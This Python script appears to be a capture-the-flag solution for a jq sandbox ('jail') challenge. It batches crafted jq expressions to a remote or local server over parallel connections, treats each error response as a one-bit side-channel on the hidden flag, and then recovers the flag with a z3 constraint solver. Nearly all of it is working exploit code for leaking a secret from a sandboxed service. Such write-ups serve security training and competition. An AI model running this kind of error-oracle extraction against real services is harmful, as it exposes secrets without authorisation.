#!/usr/bin/env python3
from __future__ import annotations
import argparse, json, time, subprocess, importlib.util, sys
from pathlib import Path
from dataclasses import dataclass

# load base
p=Path(__file__).resolve().parent/'solve_checked.py'
spec=importlib.util.spec_from_file_location('base_solve', str(p)); base=importlib.util.module_from_spec(spec); sys.modules['base_solve']=base; spec.loader.exec_module(base) # type: ignore

@dataclass(frozen=True)
class Obs:
    fi:int; reverse:bool; value:int; present:bool

class ParallelRemoteOracle:
    def __init__(self, host, port, timeout=240, conns=2):
        from concurrent.futures import ThreadPoolExecutor
        self.pool=ThreadPoolExecutor(max_workers=conns); self.oracles=[]
        last=None
        for i in range(conns):
            for a in range(1,6):
                try:
                    self.oracles.append(base.RemoteOracle(host,port,timeout)); break
                except Exception as e:
                    last=e; print(f'[!] conn {i+1} attempt {a}/5 failed: {type(e).__name__}: {e}', flush=True); time.sleep(min(2*a,8))
            else: raise last
        print(f'[+] parallel remote connections: {len(self.oracles)}', flush=True)
    def query_batch(self, exprs):
        if len(exprs)<=1: return self.oracles[0].query_batch(exprs)
        chunks=[[] for _ in self.oracles]; idxs=[[] for _ in self.oracles]
        for i,e in enumerate(exprs):
            j=i%len(self.oracles); chunks[j].append(e); idxs[j].append(i)
        futs=[self.pool.submit(o.query_batch,ch) for o,ch in zip(self.oracles,chunks)]
        out=[None]*len(exprs)
        for fut,ids in zip(futs,idxs):
            for k,a in zip(ids,fut.result()): out[k]=a
        return out
    def close(self):
        for o in self.oracles:
            try:o.close()
            except Exception:pass
        self.pool.shutdown(wait=False)

def predicate(ops):
    r=[]
    for op in ops: r += [op,'normals']
    return '|'.join(r)

def jq_accept(jq, vals, ops):
    expr=f'{json.dumps(sorted(vals),separators=(",",":"))}[] as $v | try ($v|{predicate(ops)}|$v) catch empty'
    r=subprocess.run([jq,'-n','-c',f'[{expr}]'], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
    if r.returncode not in (0,4): raise RuntimeError(f'jq accept failed {r.returncode} {r.stderr[-200:]}')
    return set(map(int,json.loads(r.stdout.strip() or '[]')))

def extend_raw_features():
    if any(getattr(f,'name','').startswith('raw_impl_j') for f in base.FEATURES): return
    def nested_json(value,nesting):
        for _ in range(nesting): value=json.dumps(value, ensure_ascii=False, separators=(',',':'))
        return value
    for nesting in range(0,9):
        prefix='flatten|implode|' + ('tojson|'*nesting)
        def enc(i,c,nesting=nesting):
            vals=[i] if c is None else [i,c]
            return nested_json(''.join(chr(v) for v in vals), nesting)
        def add(i,c,enc=enc): return sum(map(ord,enc(i,c)))
        def uniq(i,c,enc=enc): return sum(set(map(ord,enc(i,c))))
        base.FEATURES.append(base.Feature(f'raw_impl_j{nesting}_add', prefix+'explode|add', add))
        base.FEATURES.append(base.Feature(f'raw_impl_j{nesting}_uniq', prefix+'explode|unique|add', uniq))

def fixed_domain(pos,L,charset):
    if pos<5: return [ord('jail{'[pos])]
    if pos==L-1: return [ord('}')]
    return list(map(ord,charset))

def feature_values(L,charset,fi,rev):
    f=base.FEATURES[fi]; vals=set(); n=f.evaluate(L-1,None)
    if n is not None: vals.add(n)
    for pos in range(L):
        for c in fixed_domain(pos,L,charset):
            idx=L-1-pos if rev else pos
            v=f.evaluate(idx,c)
            if v is not None: vals.add(v)
    return vals

def build_queries(L,charset,chains,accepts,feature_count):
    exprs=[]; meta=[]; qkeys=set()
    for fi in range(feature_count):
        f=base.FEATURES[fi]
        for rev in (False,True):
            vals=feature_values(L,charset,fi,rev)
            b=base.BASE + ('|explode|reverse|implode' if rev else '')
            for ci,ops in enumerate(chains):
                inter=vals & accepts[ci]
                if len(inter)==1:
                    v=next(iter(inter)); key=(fi,rev,v)
                    # Multiple chains can isolate same value; keep first/shortest only.
                    if key in qkeys: continue
                    qkeys.add(key)
                    exprs.append(f'{b}|explode|tostream|{f.suffix}|{predicate(ops)}|error')
                    meta.append(key)
    return exprs,meta

def query_progress(oracle,exprs,batch):
    out=[]; t=time.time(); total=len(exprs)
    for off in range(0,total,batch):
        ans=oracle.query_batch(exprs[off:off+batch]); out.extend(ans)
        rate=len(out)/(time.time()-t); eta=(total-len(out))/rate if rate else 0
        print(f'    progress: {len(out)}/{total} ({100*len(out)/total:5.1f}%) | {rate:.1f} q/s | ETA {eta:.1f}s', flush=True)
    return out

def domains_constraints(L,charset,obs):
    domains={i:fixed_domain(i,L,charset) for i in range(L)}; cons=[]
    for o in obs:
        if o.present: continue
        f=base.FEATURES[o.fi]
        for pos in range(L):
            idx=L-1-pos if o.reverse else pos
            domains[pos]=[c for c in domains[pos] if f.evaluate(idx,c)!=o.value]
            if not domains[pos]: raise RuntimeError(f'empty domain pos={pos} feature={o.fi}:{f.name} rev={o.reverse} value={o.value}')
    for o in obs:
        if not o.present: continue
        f=base.FEATURES[o.fi]
        if f.evaluate(L-1,None)==o.value: continue
        opts=[]
        for pos,cs in domains.items():
            idx=L-1-pos if o.reverse else pos
            for c in cs:
                if f.evaluate(idx,c)==o.value: opts.append((pos,c))
        if opts: cons.append(frozenset(opts))
    return domains, sorted(set(cons), key=lambda x:(len(x), sorted(x)))

def solve_z3(L,domains,cons,limit):
    import z3
    xs=[z3.Int(f'c{i}') for i in range(L)]; s=z3.Solver()
    for i,cs in domains.items(): s.add(z3.Or([xs[i]==c for c in cs]))
    for con in cons: s.add(z3.Or([xs[i]==c for i,c in con]))
    sols=[]
    while len(sols)<limit and s.check()==z3.sat:
        m=s.model(); vals=[m.eval(xs[i]).as_long() for i in range(L)]
        sols.append(''.join(map(chr,vals)))
        s.add(z3.Or([xs[i]!=vals[i] for i in range(L)]))
    return sols

def run(args):
    extend_raw_features()
    chains_raw=json.loads(Path(args.chains).read_text())
    # unique chains
    chains=[]; seen=set()
    for _,ops in sorted(chains_raw.items(), key=lambda kv:int(kv[0]) if kv[0].isdigit() else 999999):
        t=tuple(ops)
        if t not in seen: seen.add(t); chains.append(ops)
    # calibrate against union of values for all used features
    union=set()
    for fi in range(args.feature_count):
        for rev in (False,True): union |= feature_values(args.length,args.charset,fi,rev)
    print(f'[+] length={args.length} features={args.feature_count} chains={len(chains)} union={len(union)}', flush=True)
    accepts=[]
    for i,ops in enumerate(chains,1):
        accepts.append(jq_accept(args.jq, union, ops))
        if i==1 or i%50==0 or i==len(chains): print(f'    calibrated {i}/{len(chains)}', flush=True)
    exprs,meta=build_queries(args.length,args.charset,chains,accepts,args.feature_count)
    print(f'[*] relative-exact broad phase: {len(exprs)} queries', flush=True)
    if args.mode=='local': oracle=base.LocalServerOracle(Path('server.py'),args.flag,args.jq,args.timeout)
    else: oracle=ParallelRemoteOracle(args.host,args.port,args.timeout,args.conns)
    try:
        answers=query_progress(oracle,exprs,args.batch)
    finally:
        oracle.close()
    obs=[Obs(fi,rev,v,a=='error') for (fi,rev,v),a in zip(meta,answers)]
    domains,cons=domains_constraints(args.length,args.charset,obs)
    print(f'[+] domain_size={sum(map(len,domains.values()))} amb={sum(1 for cs in domains.values() if len(cs)>1)} constraints={len(cons)}', flush=True)
    sols=solve_z3(args.length,domains,cons,args.limit)
    print(f'[+] solutions_count={len(sols)}', flush=True)
    for sol in sols: print('[+] candidate:', sol, flush=True)
    if len(sols)==1:
        print('[+] recovered flag:', sols[0], flush=True)
        if args.mode=='local' and sols[0]!=args.flag: print('[-] local mismatch expected:',args.flag, flush=True); return 1
        return 0
    return 2

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('--length',type=int,default=142); ap.add_argument('--chains',default='chains_augmented.json')
    ap.add_argument('--charset',default=base.DEFAULT_CHARSET); ap.add_argument('--feature-count',type=int,default=124)
    ap.add_argument('--batch',type=int,default=512); ap.add_argument('--limit',type=int,default=3); ap.add_argument('--timeout',type=int,default=240); ap.add_argument('--jq',default='jq'); ap.add_argument('--conns',type=int,default=2)
    sub=ap.add_subparsers(dest='mode',required=True); loc=sub.add_parser('local'); loc.add_argument('--flag',required=True); rem=sub.add_parser('remote'); rem.add_argument('host'); rem.add_argument('port',type=int)
    raise SystemExit(run(ap.parse_args()))
if __name__=='__main__': main()
